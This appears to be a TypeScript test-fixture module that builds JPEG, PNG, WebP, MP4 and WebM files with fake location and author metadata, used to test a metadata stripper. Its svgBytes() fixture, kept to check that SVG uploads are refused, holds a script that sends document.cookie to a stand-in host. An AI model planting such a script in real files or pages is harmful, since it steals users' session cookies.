/**
 * Byte-level fixtures for the media tests.
 *
 * Built rather than checked in, for one reason: a test that asserts "the EXIF
 * is gone" is only worth anything if the test itself put the EXIF there. A
 * binary fixture file is opaque — nobody reading the test can see what it
 * contains, and a fixture that quietly lost its metadata would leave a passing
 * test proving nothing at all.
 *
 * Not test-only in the module sense: `scripts/verify-media.ts` uses the same
 * builders against a real database and a real store, so the thing verified
 * end to end is the thing the unit tests describe.
 */

function u8(...values: number[]): Uint8Array {
  return new Uint8Array(values)
}

function concat(parts: Uint8Array[]): Uint8Array {
  const total = parts.reduce((sum, p) => sum + p.length, 0)
  const out = new Uint8Array(total)
  let at = 0
  for (const part of parts) {
    out.set(part, at)
    at += part.length
  }
  return out
}

function ascii(text: string): Uint8Array {
  return new Uint8Array([...text].map((c) => c.charCodeAt(0)))
}

function be32(value: number): Uint8Array {
  return u8((value >>> 24) & 0xff, (value >>> 16) & 0xff, (value >>> 8) & 0xff, value & 0xff)
}

function le32(value: number): Uint8Array {
  return u8(value & 0xff, (value >>> 8) & 0xff, (value >>> 16) & 0xff, (value >>> 24) & 0xff)
}

// ---------------------------------------------------------------------------
// JPEG
// ---------------------------------------------------------------------------

function jpegSegment(marker: number, payload: Uint8Array): Uint8Array {
  const length = payload.length + 2
  return concat([u8(0xff, marker, (length >> 8) & 0xff, length & 0xff), payload])
}

/**
 * A JPEG carrying, in order: a JFIF header, an EXIF block with a location in
 * it, an XMP packet, an ICC profile, a comment, then a frame header and scan
 * data.
 *
 * The location string is the thing the strip test looks for afterwards. It is
 * a real-shaped EXIF payload rather than a valid one — the stripper works on
 * segment markers and never parses inside a segment, which is exactly why it
 * can be trusted with a malformed one.
 */
export function jpegWithMetadata(options: { secret?: string } = {}): Uint8Array {
  const secret = options.secret ?? 'GPS 51.5074N 0.1278W — 42 Privet Drive'

  return concat([
    u8(0xff, 0xd8), // SOI
    jpegSegment(0xe0, concat([ascii('JFIF\0'), u8(1, 1, 0, 0, 1, 0, 1, 0, 0)])), // APP0
    jpegSegment(0xe1, concat([ascii('Exif\0\0'), ascii(secret)])), // APP1 EXIF
    jpegSegment(0xe1, concat([ascii('http://ns.adobe.com/xap/1.0/\0'), ascii(secret)])), // APP1 XMP
    jpegSegment(0xe2, concat([ascii('ICC_PROFILE\0'), ascii(secret)])), // APP2 ICC
    jpegSegment(0xed, concat([ascii('Photoshop 3.0\0'), ascii(secret)])), // APP13 IPTC
    jpegSegment(0xfe, ascii(secret)), // COM
    // SOF0: precision, height 0x0040, width 0x0080, one component.
    jpegSegment(0xc0, u8(8, 0x00, 0x40, 0x00, 0x80, 1, 1, 0x11, 0)),
    jpegSegment(0xda, u8(1, 1, 0, 0, 63, 0)), // SOS header
    u8(0x12, 0x34, 0x56, 0x78), // entropy-coded data
    u8(0xff, 0xd9), // EOI
  ])
}

// ---------------------------------------------------------------------------
// PNG
// ---------------------------------------------------------------------------

const PNG_SIGNATURE = u8(0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a)

function pngChunk(type: string, payload: Uint8Array): Uint8Array {
  // The CRC is not recomputed. Nothing in this codebase validates one, and a
  // stripper that copies chunks verbatim keeps whatever CRC was there.
  return concat([be32(payload.length), ascii(type), payload, be32(0)])
}

/** A PNG with a tEXt comment, an iTXt block, an eXIf block and a timestamp. */
export function pngWithMetadata(options: { secret?: string } = {}): Uint8Array {
  const secret = options.secret ?? 'Author: David Serene, 42 Privet Drive'

  return concat([
    PNG_SIGNATURE,
    pngChunk('IHDR', concat([be32(128), be32(64), u8(8, 6, 0, 0, 0)])),
    pngChunk('tEXt', concat([ascii('Comment\0'), ascii(secret)])),
    pngChunk('iTXt', concat([ascii('XML:com.adobe.xmp\0\0\0\0\0'), ascii(secret)])),
    pngChunk('eXIf', ascii(secret)),
    pngChunk('iCCP', concat([ascii('Profile\0\0'), ascii(secret)])),
    pngChunk('tIME', u8(0x07, 0xe6, 7, 25, 12, 0, 0)),
    pngChunk('pHYs', concat([be32(2835), be32(2835), u8(1)])),
    pngChunk('IDAT', u8(0x78, 0x9c, 0x01, 0x00)),
    pngChunk('IEND', new Uint8Array(0)),
  ])
}

// ---------------------------------------------------------------------------
// A PNG a browser will actually draw
// ---------------------------------------------------------------------------

/**
 * **Every fixture above this line is undrawable, on purpose, and that turned out
 * to matter.**
 *
 * `pngChunk` says it: *"the CRC is not recomputed. Nothing in this codebase
 * validates one."* That was true of everything in this repository — `ingest`
 * reads a signature and an `IHDR`, the stripper works on chunk boundaries and
 * never looks inside one, and neither has any use for a CRC. So a fixture that
 * is real *in shape* is exactly the right tool for both, and cheaper to read.
 *
 * A **browser** validates one. And that meant the plainest question anybody
 * could ask of a media library — *does the image this application stored appear
 * on a screen?* — could not be asked at all, because nothing here could produce
 * an image capable of appearing. `verify:viewport` uploads a file through the
 * real form and looks at the thumbnail; the fixtures above give it a broken
 * image, which renders as alt text and passes every layout, contrast and tap
 * target check on the screen while showing an operator nothing.
 *
 * So this one is real: correct CRCs, a valid zlib stream and pixels. It is
 * deliberately the *only* one, and the others are deliberately left alone — a
 * repository where every fixture is a real file is a repository where nobody can
 * see what is in one.
 *
 * **Written by hand, with no `zlib` import.** The deflate stream is a single
 * *stored* block, which is a length, its complement and the bytes. That keeps
 * this module what its own docstring says it is — bytes anybody can read, built
 * in front of you — and keeps it free of a Node-only import, which matters
 * because `verify:viewport` imports it and so does the unit suite.
 */

/** CRC-32, as PNG specifies it. Built once, on first use. */
let crcTable: Uint32Array | null = null

function crc32(bytes: Uint8Array): number {
  if (!crcTable) {
    crcTable = new Uint32Array(256)
    for (let n = 0; n < 256; n += 1) {
      let c = n
      for (let k = 0; k < 8; k += 1) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1
      crcTable[n] = c >>> 0
    }
  }
  let crc = 0xffffffff
  for (const byte of bytes) crc = crcTable[(crc ^ byte) & 0xff]! ^ (crc >>> 8)
  return (crc ^ 0xffffffff) >>> 0
}

/** Adler-32, which is what closes a zlib stream. */
function adler32(bytes: Uint8Array): number {
  let a = 1
  let b = 0
  for (const byte of bytes) {
    a = (a + byte) % 65521
    b = (b + a) % 65521
  }
  return ((b << 16) | a) >>> 0
}

/** A chunk whose CRC is real, unlike `pngChunk`'s. */
function checkedChunk(type: string, payload: Uint8Array): Uint8Array {
  const typed = concat([ascii(type), payload])
  return concat([be32(payload.length), typed, be32(crc32(typed))])
}

/**
 * A zlib stream holding `raw`, stored rather than compressed.
 *
 * `0x78 0x01` is the zlib header for the lowest compression setting, which is
 * what a stored block is. Each block carries at most 65535 bytes; the fixture
 * below is 8,256, so there is one — but the loop is written for more, because a
 * fixture that silently truncated at 64 KB would be a broken image again.
 */
function storedZlib(raw: Uint8Array): Uint8Array {
  const blocks: Uint8Array[] = []
  for (let at = 0; at < raw.length; at += 65535) {
    const slice = raw.subarray(at, Math.min(at + 65535, raw.length))
    const final = at + 65535 >= raw.length ? 1 : 0
    blocks.push(
      concat([
        u8(final),
        u8(slice.length & 0xff, (slice.length >> 8) & 0xff),
        u8(~slice.length & 0xff, (~slice.length >> 8) & 0xff),
        slice,
      ]),
    )
  }
  return concat([u8(0x78, 0x01), ...blocks, be32(adler32(raw))])
}

/**
 * 128 × 64, eight-bit greyscale, with the same metadata blocks the fixture above
 * carries — and drawable.
 *
 * The dimensions match `pngWithMetadata` so a check can be moved between the two
 * without its assertions changing. The pixels are a gradient rather than a flat
 * fill, so a decoder that produced the right *size* from the wrong data would
 * still be showing something recognisably wrong.
 */
export function drawablePngWithMetadata(options: { secret?: string } = {}): Uint8Array {
  const secret = options.secret ?? 'Author: David Serene, 42 Privet Drive'
  const width = 128
  const height = 64

  // One filter byte per row, filter 0 (none), then one byte per pixel.
  const raw = new Uint8Array(height * (width + 1))
  for (let y = 0; y < height; y += 1) {
    const row = y * (width + 1)
    raw[row] = 0
    for (let x = 0; x < width; x += 1) raw[row + 1 + x] = (x * 2 + y) & 0xff
  }

  return concat([
    PNG_SIGNATURE,
    checkedChunk('IHDR', concat([be32(width), be32(height), u8(8, 0, 0, 0, 0)])),
    // The blocks the stripper is meant to remove. Their CRCs are real too, so a
    // browser reading the *unstripped* fixture would also draw it — which is
    // what makes "the served copy has none of these" a statement about the
    // application rather than about a malformed input it happened to reject.
    checkedChunk('tEXt', concat([ascii('Comment\0'), ascii(secret)])),
    checkedChunk('iTXt', concat([ascii('XML:com.adobe.xmp\0\0\0\0\0'), ascii(secret)])),
    checkedChunk('eXIf', ascii(secret)),
    checkedChunk('tIME', u8(0x07, 0xe6, 7, 25, 12, 0, 0)),
    checkedChunk('pHYs', concat([be32(2835), be32(2835), u8(1)])),
    checkedChunk('IDAT', storedZlib(raw)),
    checkedChunk('IEND', new Uint8Array(0)),
  ])
}

// ---------------------------------------------------------------------------
// WebP
// ---------------------------------------------------------------------------

function riffChunk(type: string, payload: Uint8Array): Uint8Array {
  const padding = payload.length % 2 === 1 ? u8(0) : new Uint8Array(0)
  return concat([ascii(type), le32(payload.length), payload, padding])
}

/**
 * An extended WebP whose VP8X flags announce an ICC profile, EXIF and XMP, all
 * three of which are present.
 */
export function webpWithMetadata(options: { secret?: string } = {}): Uint8Array {
  const secret = options.secret ?? 'Taken at 51.5074, -0.1278 — 42 Privet Drive'

  // Flags byte: ICC 0x20 | EXIF 0x08 | XMP 0x04. Canvas 128×64, minus one,
  // three bytes little-endian each.
  const vp8x = concat([u8(0x2c, 0, 0, 0), u8(127, 0, 0), u8(63, 0, 0)])

  const body = concat([
    riffChunk('VP8X', vp8x),
    riffChunk('ICCP', ascii(secret)),
    riffChunk('VP8 ', u8(0x9d, 0x01, 0x2a, 0x80, 0x00, 0x40, 0x00)),
    riffChunk('EXIF', ascii(secret)),
    riffChunk('XMP ', ascii(secret)),
  ])

  return concat([ascii('RIFF'), le32(body.length + 4), ascii('WEBP'), body])
}

// ---------------------------------------------------------------------------
// MP4
// ---------------------------------------------------------------------------

function isoBox(type: string, payload: Uint8Array): Uint8Array {
  return concat([be32(payload.length + 8), ascii(type), payload])
}

/**
 * An MP4 whose `moov` contains a `udta` holding a QuickTime `©xyz` location
 * atom — which is precisely what an iPhone writes — followed by an `mdat`.
 *
 * The `mdat` matters: the strip test asserts the file length is unchanged, and
 * the reason that assertion exists is that shrinking anything before `mdat`
 * would invalidate every sample offset in `moov`.
 */
export function mp4WithLocation(options: { secret?: string } = {}): Uint8Array {
  const secret = options.secret ?? '+51.5074-000.1278/'

  const udta = isoBox(
    'udta',
    concat([isoBox('©xyz', concat([u8(0, 18, 0x15, 0xc7), ascii(secret)]))]),
  )

  const moov = isoBox(
    'moov',
    concat([isoBox('mvhd', new Uint8Array(100)), udta, isoBox('trak', new Uint8Array(40))]),
  )

  return concat([
    isoBox('ftyp', concat([ascii('isom'), be32(512), ascii('isomiso2mp41')])),
    moov,
    isoBox('mdat', new Uint8Array([1, 2, 3, 4, 5, 6, 7, 8])),
  ])
}

// ---------------------------------------------------------------------------
// Formats that are recognised and refused
// ---------------------------------------------------------------------------

export function svgBytes(): Uint8Array {
  return ascii(
    '<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">' +
      '<script>fetch("https://elsewhere.example/"+document.cookie)</script></svg>',
  )
}

export function gifBytes(): Uint8Array {
  return concat([ascii('GIF89a'), u8(1, 0, 1, 0, 0x80, 0, 0), new Uint8Array(16)])
}

export function pdfBytes(): Uint8Array {
  return concat([ascii('%PDF-1.7\n'), new Uint8Array(16)])
}

export function webmBytes(): Uint8Array {
  return concat([u8(0x1a, 0x45, 0xdf, 0xa3), new Uint8Array(16)])
}

export const FIXTURE_SECRET_MARKER = 'Privet Drive'

// ---------------------------------------------------------------------------
// WebM / Matroska
// ---------------------------------------------------------------------------

/** An EBML size VINT, written in the fewest bytes that hold the value. */
function ebmlSize(value: number): Uint8Array {
  for (let length = 1; length <= 8; length += 1) {
    if (value <= Math.pow(2, 7 * length) - 2) {
      const out = new Uint8Array(length)
      let remaining = value
      for (let i = length - 1; i >= 0; i -= 1) {
        out[i] = remaining % 256
        remaining = Math.floor(remaining / 256)
      }
      out[0] = out[0]! | (0x80 >> (length - 1))
      return out
    }
  }
  throw new Error('size too large for a fixture')
}

/** One EBML element: its id bytes, its size, and its payload. */
function ebml(id: number[], payload: Uint8Array): Uint8Array {
  return concat([u8(...id), ebmlSize(payload.length), payload])
}

/**
 * A WebM shaped like one a phone or a screen recorder produces: an EBML header,
 * then a Segment holding Info with a `Title`, a `MuxingApp`, a `WritingApp` and
 * a `DateUTC`; a Tracks with a named track; a Tags block full of free text; and
 * a Cluster of frame data at the end.
 *
 * The Cluster matters for the same reason the `mdat` matters in the MP4
 * fixture: Matroska addresses elements by absolute byte position, so the test
 * that the length is unchanged is really a test that seeking still works.
 */
export function webmWithMetadata(options: { secret?: string } = {}): Uint8Array {
  const secret = options.secret ?? 'Recorded by David at 42 Privet Drive'

  const header = ebml(
    [0x1a, 0x45, 0xdf, 0xa3],
    concat([
      ebml([0x42, 0x82], ascii('webm')), // DocType
      ebml([0x42, 0x87], u8(2)), // DocTypeVersion
    ]),
  )

  const info = ebml(
    [0x15, 0x49, 0xa9, 0x66],
    concat([
      ebml([0x2a, 0xd7, 0xb1], u8(0x0f, 0x42, 0x40)), // TimestampScale
      ebml([0x7b, 0xa9], ascii(`Title: ${secret}`)),
      ebml([0x4d, 0x80], ascii(`Muxed by software belonging to ${secret}`)),
      ebml([0x57, 0x41], ascii(`Written by software registered to ${secret}`)),
      ebml([0x44, 0x61], u8(0, 0, 0, 0, 0, 0, 0, 1)), // DateUTC
    ]),
  )

  const tracks = ebml(
    [0x16, 0x54, 0xae, 0x6b],
    concat([
      ebml(
        [0xae],
        concat([
          ebml([0xd7], u8(1)), // TrackNumber
          ebml([0x83], u8(1)), // TrackType
          ebml([0x53, 0x6e], ascii(`Camera of ${secret}`)), // Name
          ebml([0x86], ascii('V_VP8')), // CodecID
        ]),
      ),
    ]),
  )

  const tags = ebml(
    [0x12, 0x54, 0xc3, 0x67],
    concat([
      ebml(
        [0x73, 0x73],
        concat([
          ebml(
            [0x67, 0xc8],
            concat([ebml([0x45, 0xa3], ascii('LOCATION')), ebml([0x44, 0x87], ascii(secret))]),
          ),
        ]),
      ),
    ]),
  )

  const cluster = ebml(
    [0x1f, 0x43, 0xb6, 0x75],
    concat([
      ebml([0xe7], u8(0)), // Timestamp
      ebml([0xa3], u8(0x81, 0, 0, 0x80, 1, 2, 3, 4, 5, 6, 7, 8)), // SimpleBlock
    ]),
  )

  const segment = ebml([0x18, 0x53, 0x80, 0x67], concat([info, tracks, tags, cluster]))

  return concat([header, segment])
}
